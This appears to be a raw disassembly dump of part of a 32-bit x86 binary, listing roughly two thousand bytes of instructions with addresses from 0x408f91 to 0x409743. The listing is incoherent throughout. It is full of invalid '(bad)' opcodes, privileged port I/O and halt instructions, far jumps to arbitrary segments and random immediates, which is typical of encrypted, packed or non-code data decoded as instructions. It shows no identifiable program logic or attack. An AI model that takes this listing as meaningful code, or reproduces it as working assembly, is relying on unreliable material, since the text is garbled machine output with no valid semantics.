  408f91:	push   esi
  408f92:	cmp    ebx,DWORD PTR [ebx+0x13a8696b]
  408f98:	jecxz  0x409000
  408f9a:	repnz add al,0xb8
  408f9d:	mov    eax,0xa758cf6b
  408fa2:	pop    edx
  408fa3:	cdq    
  408fa4:	icebp  
  408fa5:	adc    eax,0x15dabae
  408faa:	cdq    
  408fab:	(bad)  
  408fac:	pop    eax
  408fad:	mov    esp,DWORD PTR [ecx+0x5e]
  408fb0:	cmp    eax,0x87398695
  408fb5:	ret    
  408fb6:	aaa    
  408fb7:	lods   al,BYTE PTR ds:[esi]
  408fb8:	lods   al,BYTE PTR ds:[esi]
  408fb9:	jge    0x408fd2
  408fbb:	or     eax,ebx
  408fbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408fbe:	xchg   esi,eax
  408fbf:	inc    eax
  408fc0:	xchg   ebx,eax
  408fc1:	push   ebp
  408fc2:	fdiv   st,st(5)
  408fc4:	inc    ecx
  408fc5:	jmp    0x532b:0x4c99e58e
  408fcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fcd:	call   DWORD PTR [ebp+0x64f3b4e6]
  408fd3:	dec    edx
  408fd4:	pop    di
  408fd6:	popf   
  408fd7:	xor    dl,BYTE PTR [ecx]
  408fd9:	retf   
  408fda:	pop    es
  408fdb:	pop    es
  408fdc:	mov    WORD PTR [ecx+0x657aa2b1],fs
  408fe2:	sbb    DWORD PTR [ebp+0xb5b975f],ecx
  408fe8:	pushf  
  408fe9:	push   eax
  408fea:	push   ss
  408feb:	cmp    edx,DWORD PTR [ebx]
  408fed:	inc    ebx
  408fee:	jne    0x409038
  408ff0:	scas   al,BYTE PTR es:[edi]
  408ff1:	pop    edx
  408ff3:	pop    edi
  408ff4:	jmp    0x408ff1
  408ff6:	jle    0x408fd7
  408ff8:	pop    ds
  408ff9:	jge    0x408f80
  408ffb:	pop    esi
  408ffc:	es (bad) 
  408ffe:	retf   
  408fff:	stc    
  409000:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409001:	mov    ch,0x3c
  409003:	ins    BYTE PTR es:[edi],dx
  409004:	in     al,0x49
  409006:	and    eax,0x948da0a8
  40900b:	adc    BYTE PTR ss:[eax],bl
  40900e:	xor    BYTE PTR [edi],dl
  409010:	cmp    al,0x78
  409012:	jg     0x409020
  409014:	pop    ebx
  409015:	in     al,dx
  409016:	mov    ds:0xcc7a1b71,eax
  40901b:	shr    BYTE PTR [edi+0x41],0x44
  40901f:	cwde   
  409020:	mov    WORD PTR [ebx],ds
  409022:	xor    BYTE PTR [eax-0x32857b09],dh
  409028:	mov    eax,DWORD PTR [esi]
  40902a:	daa    
  40902b:	sub    al,0xf2
  40902d:	stc    
  40902e:	dec    edi
  40902f:	adc    ecx,DWORD PTR [ebp+ebx*8+0x59d8c530]
  409036:	or     dh,BYTE PTR fs:[ebx]
  409039:	xlat   BYTE PTR ds:[ebx]
  40903a:	xchg   esi,eax
  40903b:	mov    ebx,0xb6ad552
  409040:	dec    esp
  409041:	inc    eax
  409042:	not    BYTE PTR [esp+ebx*8+0x23]
  409046:	stos   BYTE PTR es:[di],al
  409048:	push   esi
  409049:	add    BYTE PTR [eax],ch
  40904b:	enter  0x17f,0xc9
  40904f:	push   ds
  409050:	or     DWORD PTR [ebx],ebx
  409052:	and    DWORD PTR [esi+0x7a],0x7e
  409056:	add    ah,bl
  409058:	sub    al,0xc2
  40905a:	ins    DWORD PTR es:[edi],dx
  40905b:	sbb    al,0xe0
  40905d:	lock pop ebx
  40905f:	pop    edx
  409060:	xchg   ebx,eax
  409061:	jno    0x4090de
  409063:	stos   DWORD PTR es:[edi],eax
  409064:	imul   BYTE PTR [ebp+0x22]
  409067:	sub    ebp,DWORD PTR [eax-0x18]
  40906a:	jg     0x408fff
  40906c:	push   edx
  40906d:	mov    edx,0x43a773d9
  409072:	imul   ecx,DWORD PTR [esi],0xd87369be
  409078:	jae    0x409072
  40907a:	pop    DWORD PTR [eiz*8+0x6d288e95]
  409081:	sar    DWORD PTR [edi-0x8cc9ccf],0xf9
  409088:	(bad)  
  409089:	jmp    FWORD PTR [eax+0xe]
  40908c:	rcl    DWORD PTR [eax+0x1a],1
  40908f:	ins    DWORD PTR es:[edi],dx
  409090:	mov    bh,0x5e
  409092:	test   eax,edx
  409094:	pushf  
  409095:	cmp    ch,BYTE PTR [ebx+eiz*4]
  409098:	sub    eax,0x9b70ebe
  40909d:	bound  esi,QWORD PTR [ebx]
  40909f:	pop    ss
  4090a0:	jae    0x4090bd
  4090a2:	sar    BYTE PTR [esi],cl
  4090a4:	adc    al,0x3e
  4090a6:	cmp    al,ch
  4090a8:	sbb    al,0xbe
  4090aa:	inc    edx
  4090ab:	pop    ds
  4090ac:	adc    BYTE PTR [eax],dl
  4090ae:	lea    edx,[esi]
  4090b0:	adc    ah,BYTE PTR [eax]
  4090b2:	ret    
  4090b3:	nop
  4090b4:	test   al,0xc3
  4090b6:	aam    0x2
  4090b8:	mov    al,ds:0xfdb00d6d
  4090bd:	repz aas 
  4090bf:	into   
  4090c0:	adc    ebx,ebp
  4090c2:	ds popf 
  4090c4:	(bad)  
  4090c5:	loope  0x4090b2
  4090c7:	jp     0x4090cd
  4090c9:	adc    BYTE PTR [esp+ecx*4-0x30],dl
  4090cd:	aam    0x2d
  4090cf:	mov    ds:0x7ec54554,eax
  4090d4:	or     BYTE PTR [ecx+ebp*4+0x3de74a36],bl
  4090db:	push   0x712d2a31
  4090e0:	ror    DWORD PTR [edx],0x3b
  4090e3:	icebp  
  4090e4:	fisubr WORD PTR [esi+0x4c30d46c]
  4090ea:	neg    BYTE PTR [edx+0x12]
  4090ed:	xchg   ecx,eax
  4090ee:	pop    ss
  4090ef:	popf   
  4090f0:	sub    bl,BYTE PTR [ebx-0x344fd669]
  4090f6:	dec    esi
  4090f7:	loopne 0x409159
  4090f9:	jb     0x4090ce
  4090fb:	(bad)  
  4090fc:	adc    ch,BYTE PTR [eax]
  4090fe:	dec    ecx
  4090ff:	int3   
  409100:	dec    ecx
  409101:	jmp    0x7236e1c4
  409106:	xchg   esi,eax
  409107:	aaa    
  409108:	push   edi
  409109:	mov    eax,ds:0x10c41ca0
  40910e:	pop    cx
  409110:	dec    ebp
  409111:	xor    al,bl
  409113:	mov    esi,0x18b9e5ae
  409118:	dec    esi
  409119:	fcomp  QWORD PTR [ecx]
  40911b:	xchg   ebx,eax
  40911c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40911d:	add    BYTE PTR [ebx],bh
  40911f:	ret    0xa179
  409122:	sbb    esp,ecx
  409124:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409125:	mov    edx,DWORD PTR [ebx-0x623431ba]
  40912b:	or     eax,0x4635257d
  409130:	cwde   
  409131:	inc    edx
  409132:	mov    edi,0xaf459f28
  409137:	gs and ebx,ebp
  40913a:	pop    eax
  40913b:	sar    DWORD PTR [eax+0x42d5975a],1
  409141:	ja     0x4091aa
  409143:	pop    es
  409144:	addr16 pusha 
  409146:	out    dx,eax
  409147:	fs jmp 0x8b20bc03
  40914d:	dec    ecx
  40914e:	hlt    
  40914f:	push   0x54
  409151:	inc    edi
  409152:	imul   esi,eax,0x1c
  409155:	cmp    cl,bl
  409157:	pop    ebx
  409158:	mov    ecx,0x2663e939
  40915d:	cmp    dh,BYTE PTR [ebx]
  40915f:	in     eax,dx
  409160:	ret    
  409161:	loop   0x409158
  409163:	mov    eax,0x56c40774
  409168:	out    0x8c,eax
  40916a:	mov    DWORD PTR [edi+0x6f4bb492],esp
  409170:	mov    cl,0x56
  409172:	xor    eax,0x8ee08db5
  409177:	ins    BYTE PTR es:[edi],dx
  409178:	mov    WORD PTR [ebx],?
  40917a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40917b:	div    BYTE PTR [edi+0x348b342d]
  409181:	(bad)  
  409182:	cld    
  409183:	arpl   WORD PTR [edx+0x6dabad35],dx
  409189:	stc    
  40918a:	ja     0x409140
  40918c:	pushf  
  40918d:	cmp    esp,DWORD PTR [edi+0x64]
  409190:	aam    0xb7
  409192:	ror    BYTE PTR [esp+ebp*2],1
  409195:	outs   dx,BYTE PTR ds:[esi]
  409196:	xor    BYTE PTR [edx+0x65],ah
  409199:	fnsave [edx+0x5]
  40919c:	dec    eax
  40919d:	fisttp DWORD PTR [esi]
  40919f:	jmp    0x59459543
  4091a4:	add    al,0x8b
  4091a6:	ja     0x409135
  4091a8:	enter  0x9c58,0xbb
  4091ac:	sbb    BYTE PTR [edx+0x2245f10e],bl
  4091b2:	jmp    0x4091ab
  4091b4:	cmp    DWORD PTR [ecx],ebx
  4091b6:	mov    BYTE PTR [ecx-0x7d],al
  4091b9:	mov    esp,0x213ec7a
  4091be:	fwait
  4091bf:	out    0x17,al
  4091c1:	ins    BYTE PTR es:[edi],dx
  4091c2:	push   edx
  4091c3:	sbb    BYTE PTR [ecx+0x3ad9c249],bl
  4091c9:	fidiv  WORD PTR [esi+ecx*8]
  4091cc:	xor    bl,BYTE PTR [ecx+0x137b2c54]
  4091d2:	and    BYTE PTR [edi+0x1f],ch
  4091d5:	jnp    0x4091e5
  4091d7:	sub    DWORD PTR [eax+0xb],esp
  4091da:	jp     0x40925b
  4091dc:	sbb    esi,esi
  4091de:	icebp  
  4091df:	and    eax,edi
  4091e1:	or     ecx,DWORD PTR [esi-0x78]
  4091e4:	jbe    0x40916d
  4091e6:	xchg   esi,eax
  4091e7:	push   edi
  4091e8:	arpl   WORD PTR [edi-0x1904d15f],cx
  4091ee:	xor    bl,dl
  4091f0:	test   eax,0x1f62075f
  4091f5:	mov    dh,0x69
  4091f7:	sar    DWORD PTR [edi-0x4d],0x16
  4091fb:	inc    ebp
  4091fc:	(bad)  
  4091fd:	nop
  4091fe:	mov    edi,0x2f388487
  409203:	inc    edx
  409204:	sub    ebx,DWORD PTR [edx]
  409206:	in     al,0x51
  409208:	fidiv  DWORD PTR [edi+0x50b24282]
  40920e:	push   ebx
  40920f:	push   0xffffff8d
  409211:	pop    ss
  409212:	jecxz  0x40923d
  409214:	inc    ecx
  409215:	imul   ebx,edx,0xd24c643d
  40921b:	fs jmp 0x40927b
  40921e:	pop    ebx
  40921f:	push   ecx
  409220:	into   
  409221:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409222:	pusha  
  409223:	imul   ecx,DWORD PTR [esi+0x64],0x1efdc032
  40922a:	into   
  40922b:	fild   DWORD PTR [eax]
  40922d:	test   edx,esi
  40922f:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409231:	fistp  QWORD PTR [edi+0x60]
  409234:	pop    cx
  409236:	sar    BYTE PTR [ebx+edi*8+0x2d],0xcd
  40923b:	pusha  
  40923c:	mov    edx,0x892ba9a4
  409241:	sbb    dh,BYTE PTR [esi]
  409243:	mov    edi,0xbf4a0d26
  409248:	xchg   ecx,eax
  409249:	and    edx,DWORD PTR [edx]
  40924b:	jl     0x4092a5
  40924d:	scas   al,BYTE PTR es:[edi]
  40924e:	sbb    DWORD PTR [ecx-0x606a3e0a],esp
  409254:	cli    
  409255:	(bad)  
  409256:	scas   eax,DWORD PTR es:[edi]
  409257:	cmp    DWORD PTR [edi],eax
  409259:	sub    eax,0x81e5333e
  40925e:	(bad)
  409261:	loop   0x40925b
  409263:	cmp    edi,ebp
  409265:	std    
  409266:	or     eax,0x859e5762
  40926b:	cmp    eax,0x3e41085c
  409270:	sbb    dl,bh
  409272:	shl    DWORD PTR ds:[eax],cl
  409275:	or     esp,DWORD PTR [edx]
  409277:	xor    ecx,DWORD PTR [ebx+0x79]
  40927a:	ss pop esp
  40927c:	rcr    BYTE PTR [edx+esi*8+0x48],0x17
  409281:	and    eax,0xb09e19e4
  409286:	xchg   ecx,eax
  409287:	shr    DWORD PTR [edi-0x7c],cl
  40928a:	sti    
  40928b:	data16 ins BYTE PTR es:[edi],dx
  40928d:	jae    0x409290
  40928f:	fst    DWORD PTR [ecx+edi*4+0x184742f3]
  409296:	mov    eax,0x2d4cb574
  40929b:	sbb    dh,BYTE PTR [eax-0x5a]
  40929e:	push   ss
  40929f:	dec    DWORD PTR [edx+0x32]
  4092a2:	mov    cs,WORD PTR [ebp-0x6]
  4092a5:	jnp    0x4092e4
  4092a7:	jmp    0x409277
  4092a9:	ins    BYTE PTR es:[edi],dx
  4092aa:	mov    cl,0xbc
  4092ac:	cmp    al,0xe1
  4092ae:	or     BYTE PTR [ecx-0x77],al
  4092b1:	inc    eax
  4092b2:	call   0xf1582b26
  4092b7:	div    BYTE PTR [esi-0x46]
  4092ba:	stos   BYTE PTR es:[edi],al
  4092bb:	es ss cmp ebp,0xffffffe2
  4092c0:	aad    0x8
  4092c2:	mov    esp,0xa47ccd1a
  4092c7:	mov    edi,0xf53a15d3
  4092cc:	cld    
  4092cd:	les    eax,FWORD PTR [ebx+0x4119d4b0]
  4092d3:	inc    edi
  4092d4:	pusha  
  4092d5:	leave  
  4092d6:	inc    esi
  4092d7:	retf   
  4092d8:	sub    ch,cl
  4092da:	stos   BYTE PTR es:[edi],al
  4092db:	out    0xe7,al
  4092dd:	mov    ah,0xb1
  4092df:	dec    eax
  4092e0:	add    edx,DWORD PTR [ebp-0x6fc0c6f9]
  4092e6:	aad    0x88
  4092e8:	(bad)  
  4092e9:	rcl    DWORD PTR [ecx-0x7684ef2a],cl
  4092ef:	dec    edi
  4092f0:	stc    
  4092f1:	jge    0x4092fe
  4092f3:	pushf  
  4092f4:	mov    ds:0x90270efa,al
  4092f9:	adc    edx,DWORD PTR [edx-0x7d]
  4092fc:	and    BYTE PTR ds:0xa632349d,bl
  409302:	cmp    BYTE PTR [eax],cl
  409304:	dec    edx
  409305:	pop    ebp
  409306:	cmp    dh,BYTE PTR [ebx+edi*8]
  409309:	jl     0x4092c7
  40930b:	mov    ds:0x3e422446,eax
  409310:	add    ch,BYTE PTR [edx-0x6716cd32]
  409316:	mov    al,0xb
  409318:	mov    ?,WORD PTR [ebx]
  40931a:	fsubr  QWORD PTR [ebx+0x4c]
  40931d:	dec    ecx
  40931e:	(bad)  
  40931f:	dec    BYTE PTR [esi]
  409321:	adc    eax,ebp
  409323:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409324:	pushf  
  409325:	dec    ecx
  409326:	mov    ebp,0x767bea2c
  40932b:	imul   eax,DWORD PTR [ecx],0x9c19c1f9
  409331:	jo     0x4092f5
  409333:	shl    BYTE PTR [ebp+0x54],1
  409336:	xor    eax,0xcb2f1419
  40933b:	cs xchg ecx,eax
  40933d:	or     DWORD PTR ds:[ebp+0x60574847],ecx
  409344:	in     eax,0x6
  409346:	mov    edx,0x62737eca
  40934b:	das    
  40934c:	sti    
  40934d:	sub    BYTE PTR ds:0xf41b752,ch
  409354:	(bad)  
  409355:	int3   
  409356:	or     bl,BYTE PTR [ebp+0x6f230023]
  40935c:	push   0xfffffffb
  40935e:	sbb    ebx,DWORD PTR ds:0x1fe9c42a
  409364:	jne    0x40933e
  409366:	jns    0x40930d
  409368:	sub    eax,0xdb2dfb78
  40936d:	and    eax,0x92eb7cdb
  409372:	inc    esp
  409373:	je     0x40932c
  409375:	mov    ebp,0x2c2e0112
  40937a:	icebp  
  40937b:	cwde   
  40937c:	add    dl,ah
  40937e:	(bad)  
  40937f:	adc    BYTE PTR [eax],ch
  409381:	mov    eax,0x10d519e3
  409386:	xor    eax,0x40f39547
  40938b:	ret    0x5b35
  40938e:	mov    dh,0xa9
  409390:	(bad)  
  409391:	mov    ebp,0x2c9a1260
  409396:	push   edi
  409397:	and    edx,DWORD PTR [ebp+0x1bc56e45]
  40939d:	adc    edx,DWORD PTR [edx-0x67]
  4093a0:	jb     0x409375
  4093a2:	cs arpl si,bp
  4093a5:	in     eax,0xf
  4093a7:	sahf   
  4093a8:	xchg   BYTE PTR [ebx-0x78517aa5],bl
  4093ae:	das    
  4093af:	add    dl,dh
  4093b1:	xlat   BYTE PTR ds:[ebx]
  4093b2:	test   eax,0x7f9a0b63
  4093b7:	jl     0x4093d6
  4093b9:	imul   esi,edi,0x529de284
  4093bf:	cmc    
  4093c0:	into   
  4093c1:	pop    es
  4093c2:	pop    eax
  4093c3:	out    0x85,eax
  4093c5:	lods   eax,DWORD PTR ds:[esi]
  4093c6:	in     al,dx
  4093c7:	and    BYTE PTR [edx-0x622dc835],dl
  4093cd:	(bad)  
  4093ce:	cmp    eax,0x11d91e88
  4093d3:	xor    ecx,0xdccf4dfa
  4093d9:	dec    ecx
  4093da:	dec    esp
  4093db:	sahf   
  4093dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093dd:	and    eax,0x47e0e0e7
  4093e2:	jno    0x4093bd
  4093e4:	pop    esi
  4093e5:	rol    edi,cl
  4093e7:	not    DWORD PTR [eax+edi*2+0x7c]
  4093eb:	pop    edx
  4093ec:	mov    bl,0x7a
  4093ee:	inc    edx
  4093ef:	dec    ebp
  4093f0:	jne    0x409434
  4093f2:	mov    bh,0x93
  4093f4:	mov    eax,DWORD PTR [esi]
  4093f6:	ror    ebx,1
  4093f8:	in     al,dx
  4093f9:	pusha  
  4093fa:	ret    0xb41c
  4093fd:	jmp    0x3de3:0xe676ae8b
  409404:	dec    esi
  409405:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409406:	cmp    ebx,DWORD PTR [esi]
  409408:	cli    
  409409:	leave  
  40940a:	dec    esi
  40940b:	(bad)  
  40940c:	int    0x57
  40940e:	adc    ecx,edi
  409410:	jne    0x4093fd
  409412:	jo     0x409461
  409414:	inc    ebx
  409415:	test   eax,0x126225d0
  40941a:	sub    esp,DWORD PTR [ecx]
  40941c:	fs hlt 
  40941e:	lods   al,BYTE PTR ds:[esi]
  40941f:	rcl    DWORD PTR [ecx+edx*4],0x9f
  409423:	jp     0x40947c
  409425:	jmp    0xfd63:0x30e517d7
  40942c:	xchg   ebp,eax
  40942d:	cmp    DWORD PTR cs:[edx+ebx*8+0x7486d45f],ebp
  409435:	or     eax,0x25981b8d
  40943a:	adc    BYTE PTR [eax+0x71f3c542],bl
  409440:	retf   
  409441:	es bnd jne 0x4093fc
  409445:	mov    WORD PTR [ebp-0x3252de2a],cs
  40944b:	pop    edx
  40944c:	sub    eax,0x6bae4121
  409451:	or     bl,BYTE PTR [edx+0xc]
  409454:	scas   al,BYTE PTR es:[edi]
  409455:	(bad)  
  409456:	fnstcw WORD PTR [eax]
  409458:	push   eax
  409459:	rcr    BYTE PTR ds:0xd90c9d82,1
  40945f:	cmp    eax,0xb7af9905
  409464:	pop    DWORD PTR [eax+0x29c6ab85]
  40946a:	jmp    FWORD PTR [ebx-0x249929fc]
  409470:	push   ecx
  409471:	syscall 
  409473:	lock adc al,0x49
  409476:	xlat   BYTE PTR ds:[ebx]
  409477:	add    al,0x65
  409479:	push   eax
  40947a:	pop    esi
  40947b:	or     dh,cl
  40947d:	xor    DWORD PTR [esi+0x4c8155d],edi
  409483:	ins    BYTE PTR es:[edi],dx
  409484:	mov    esi,0xee23f1f6
  409489:	out    0x3b,al
  40948b:	push   ss
  40948c:	int    0x19
  40948e:	push   ss
  40948f:	aam    0x6c
  409491:	pop    edx
  409492:	pop    ds
  409493:	mov    edi,0xfb394013
  409498:	call   0xaacc:0xa8d64424
  40949f:	inc    ebp
  4094a0:	and    DWORD PTR [edi-0x21],esp
  4094a3:	mov    dl,0xa0
  4094a5:	jg     0x409448
  4094a7:	and    DWORD PTR [edx-0x78],edx
  4094aa:	sar    BYTE PTR [ecx],1
  4094ac:	pop    es
  4094ad:	and    eax,0x245ba4fc
  4094b2:	push   es
  4094b3:	out    dx,eax
  4094b4:	ss inc esp
  4094b6:	pop    eax
  4094b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4094b8:	mov    ebp,0x44cc38ca
  4094bd:	push   esi
  4094be:	mov    edx,DWORD PTR [ecx-0x41]
  4094c1:	jecxz  0x40949d
  4094c3:	push   ss
  4094c4:	and    eax,0x59f27fef
  4094c9:	(bad)  
  4094ca:	xor    esi,DWORD PTR [edx]
  4094cc:	mov    eax,0x2c2c2674
  4094d1:	loop   0x409516
  4094d3:	mov    esp,0x808e3ba9
  4094d8:	out    0x8,al
  4094da:	mov    al,0xd6
  4094dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4094dd:	es mov dh,0x38
  4094e0:	push   esp
  4094e1:	sbb    BYTE PTR [edx-0x64],al
  4094e4:	cdq    
  4094e5:	mov    esp,0xaacb69a9
  4094ea:	inc    ebx
  4094eb:	and    edi,edi
  4094ed:	shl    DWORD PTR [eax*2-0x146ca9ba],0xa8
  4094f5:	mov    cs,WORD PTR [ebp-0x466599f9]
  4094fb:	(bad)  
  4094fc:	jmp    0x9c205f03
  409501:	es xchg si,ax
  409504:	imul   esi,DWORD PTR [edx-0x7f2dabaa],0xfffffff0
  40950b:	addr16 retf 
  40950d:	js     0x409583
  40950f:	mov    bh,0x63
  409511:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409512:	xor    ch,BYTE PTR [ecx+eax*2-0x6d8e39fb]
  409519:	js     0x409584
  40951b:	xor    DWORD PTR [esi+0x0],0x6e
  40951f:	sahf   
  409520:	mov    dh,0xe0
  409522:	je     0x4094c3
  409524:	sbb    al,0x2e
  409526:	sub    al,0xe0
  409528:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409529:	inc    ebx
  40952a:	inc    ebp
  40952b:	(bad)  
  40952c:	sti    
  40952d:	lahf   
  40952e:	ja     0x40952a
  409530:	xchg   ebp,eax
  409531:	jo     0x4095a8
  409533:	adc    DWORD PTR [esi],edi
  409535:	push   edi
  409536:	dec    edx
  409537:	imul   esp,DWORD PTR [edi+0x37],0x7a287f66
  40953e:	inc    ebp
  40953f:	jmp    0x8969fdf0
  409544:	inc    edx
  409545:	mov    ah,0xbd
  409547:	lods   al,BYTE PTR ds:[esi]
  409548:	sub    BYTE PTR [esi+0x15],dh
  40954b:	aas    
  40954c:	jg     0x4094fb
  40954e:	inc    ebx
  40954f:	mov    eax,ds:0xa7b8fff4
  409554:	repz or esp,DWORD PTR [ecx-0x295cd750]
  40955b:	loop   0x40953f
  40955d:	(bad)  
  40955e:	out    dx,al
  40955f:	shr    BYTE PTR [ecx-0x5239c490],1
  409565:	pop    eax
  409566:	adc    edi,DWORD PTR [ebx]
  409568:	jns    0x409584
  40956a:	pop    edi
  40956b:	pop    eax
  40956c:	retf   0xb25d
  40956f:	outs   dx,DWORD PTR ds:[esi]
  409570:	mov    ch,0xc7
  409572:	cwde   
  409573:	jbe    0x40953d
  409575:	les    edx,FWORD PTR [edx+ecx*2-0x403533ee]
  40957c:	xchg   ebx,eax
  40957d:	add    ah,BYTE PTR [ecx-0x68]
  409580:	das    
  409581:	retf   
  409582:	(bad)  
  409583:	(bad)  
  409584:	adc    dl,BYTE PTR [edx-0x78]
  409587:	xlat   BYTE PTR ds:[ebx]
  409588:	fstp   QWORD PTR [ebp-0x2556a3b0]
  40958e:	enter  0x4a23,0xe4
  409592:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409593:	jle    0x409515
  409595:	stos   DWORD PTR es:[edi],eax
  409596:	inc    edx
  409597:	add    ax,0x24d0
  40959b:	add    al,0x5e
  40959d:	hlt    
  40959e:	daa    
  40959f:	mov    al,0xc2
  4095a1:	adc    BYTE PTR [ebx+ecx*4+0x70435031],bh
  4095a8:	out    dx,eax
  4095a9:	jg     0x409552
  4095ab:	dec    edi
  4095ac:	pop    ecx
  4095ad:	push   DWORD PTR [esi]
  4095af:	out    dx,al
  4095b0:	lods   al,BYTE PTR ds:[esi]
  4095b1:	icebp  
  4095b2:	push   edx
  4095b3:	popa   
  4095b4:	sahf   
  4095b5:	inc    edx
  4095b6:	cmp    DWORD PTR [edx],ebp
  4095b8:	cli    
  4095b9:	xor    eax,0xf3dabdf8
  4095be:	cli    
  4095bf:	jbe    0x40960f
  4095c1:	sub    esp,ebp
  4095c3:	shl    DWORD PTR ds:0x18b01103,cl
  4095c9:	arpl   si,dx
  4095cb:	(bad)  
  4095cc:	adc    al,0x17
  4095ce:	jmp    0x35f9:0x7e0b38aa
  4095d5:	pop    ebp
  4095d6:	xchg   esi,eax
  4095d7:	sar    BYTE PTR [edx+0xe84e67f],1
  4095dd:	out    0xf0,eax
  4095df:	stos   BYTE PTR es:[edi],al
  4095e0:	(bad)  
  4095e1:	pop    ss
  4095e2:	sahf   
  4095e3:	sub    bl,BYTE PTR [ebx]
  4095e5:	das    
  4095e6:	icebp  
  4095e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095e8:	pushf  
  4095e9:	lock imul esi,DWORD PTR [edi-0x27],0xffffffd9
  4095ee:	(bad)  
  4095f0:	gs dec edi
  4095f2:	fmul   QWORD PTR [edi-0x39f70f3d]
  4095f8:	cmp    eax,DWORD PTR [edx+0x59a6c6be]
  4095fe:	call   0x4207:0xa6d695fa
  409605:	mov    esp,0x62b06c70
  40960a:	cmp    dh,BYTE PTR [esp+ecx*8-0x20432d35]
  409611:	out    0xf9,al
  409613:	add    eax,0x36dca95
  409618:	fstp   QWORD PTR [ebp+0x6b009eff]
  40961e:	jp     0x409692
  409620:	dec    esp
  409621:	mov    esi,0xc5a3b90a
  409626:	xor    BYTE PTR [ecx-0x3bcca0f7],0xd4
  40962d:	arpl   WORD PTR [esi+ecx*4-0x1432232d],si
  409634:	outs   dx,BYTE PTR ds:[esi]
  409635:	fldenv ds:0xd298aa06
  40963b:	mov    BYTE PTR [edi-0x4f],bl
  40963e:	cmp    BYTE PTR [ebx-0x9],al
  409641:	and    DWORD PTR [ecx+eiz*1+0x6],ebx
  409645:	data16 lahf 
  409647:	shl    DWORD PTR [edx-0x8],cl
  40964a:	push   ss
  40964b:	std    
  40964c:	mul    DWORD PTR [edi-0x70]
  40964f:	dec    ebp
  409650:	out    dx,eax
  409651:	pop    es
  409652:	push   esp
  409653:	leave  
  409654:	fld    QWORD PTR [ecx+0x71e457ef]
  40965a:	cld    
  40965b:	int    0x7
  40965d:	and    DWORD PTR [eax],esi
  40965f:	pop    esp
  409660:	in     eax,0xcc
  409662:	cmp    eax,DWORD PTR [edi-0x58]
  409665:	jno    0x409687
  409667:	xchg   ebx,eax
  409668:	xor    DWORD PTR gs:0x3cd0f759,0xf4c170e2
  409673:	lds    ebx,FWORD PTR [ecx+0x72]
  409676:	not    dl
  409678:	in     eax,dx
  409679:	imul   edx,DWORD PTR [esi],0xffffff89
  40967c:	sbb    dh,BYTE PTR [ebx+0x20]
  40967f:	nop
  409680:	push   eax
  409681:	cmc    
  409682:	mov    eax,0xd311713e
  409687:	in     al,0x68
  409689:	ret    0x6a1e
  40968c:	xchg   DWORD PTR [edi],eax
  40968e:	xor    bl,al
  409690:	aaa    
  409691:	add    BYTE PTR [esi+0x5b3b778],bh
  409697:	pop    eax
  409698:	xlat   BYTE PTR ds:[ebx]
  409699:	enter  0x6cc7,0xe0
  40969d:	add    al,0x2a
  40969f:	add    ebx,esi
  4096a1:	dec    edi
  4096a2:	dec    esi
  4096a3:	sub    eax,0x6b6313bd
  4096a8:	fdivr  st,st(1)
  4096aa:	repz bound ebp,QWORD PTR [ebx]
  4096ad:	xchg   esp,eax
  4096ae:	ret    
  4096af:	test   al,0xf
  4096b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096b2:	imul   esp,DWORD PTR [esi+0x3615959d],0x18
  4096b9:	jnp    0x4096a4
  4096bb:	push   cs
  4096bc:	and    DWORD PTR [ebx-0x7d9dc63a],ecx
  4096c2:	pop    ecx
  4096c3:	push   edi
  4096c4:	inc    edi
  4096c5:	fst    st(4)
  4096c7:	cmp    ebx,DWORD PTR [edi]
  4096c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096ca:	retf   
  4096cb:	lods   eax,DWORD PTR ds:[esi]
  4096cc:	xor    ebx,DWORD PTR ds:0x53027881
  4096d2:	cmp    al,0x6b
  4096d4:	ret    
  4096d5:	clc    
  4096d6:	fidiv  WORD PTR ds:0xccfbde5f
  4096dc:	cmp    ebp,DWORD PTR [ecx]
  4096de:	ret    0x9f69
  4096e1:	lahf   
  4096e2:	ret    0xb8e4
  4096e5:	jecxz  0x4096ad
  4096e7:	icebp  
  4096e8:	cmp    ah,ch
  4096ea:	xchg   edi,eax
  4096eb:	dec    eax
  4096ec:	add    dl,BYTE PTR [ecx+0x70]
  4096ef:	outs   dx,BYTE PTR ds:[esi]
  4096f0:	cs add al,0x74
  4096f3:	out    0x2e,al
  4096f5:	add    al,0x8c
  4096f7:	hlt    
  4096f8:	ret    0x7abc
  4096fb:	and    eax,0xf5ff5607
  409700:	lods   al,BYTE PTR ds:[esi]
  409701:	aam    0x33
  409703:	or     BYTE PTR [esi+0x27],ch
  409706:	jno    0x40972d
  409708:	sub    ch,BYTE PTR [eax+edi*2-0x7c31c64e]
  40970f:	pop    ebx
  409710:	imul   DWORD PTR [esi-0x5d]
  409713:	std    
  409714:	pusha  
  409715:	fdivr  st,st(0)
  409717:	jge    0x409721
  409719:	imul   eax,ecx,0x49
  40971c:	imul   ebx,DWORD PTR [ebx+0x36],0x36
  409720:	iret   
  409721:	xor    DWORD PTR [ecx],eax
  409723:	(bad)  
  409724:	int3   
  409725:	sbb    al,0x10
  409727:	sbb    edi,ecx
  409729:	and    DWORD PTR [eax],0x25
  40972c:	es test eax,0x179739fb
  409732:	xchg   edi,eax
  409733:	nop
  409734:	mov    esi,0x9cd1a050
  409739:	mov    ebx,0xa9d99f0
  40973e:	mov    ebx,0x2dc3047c
  409743:	mov    eax,0xfcc32f9e
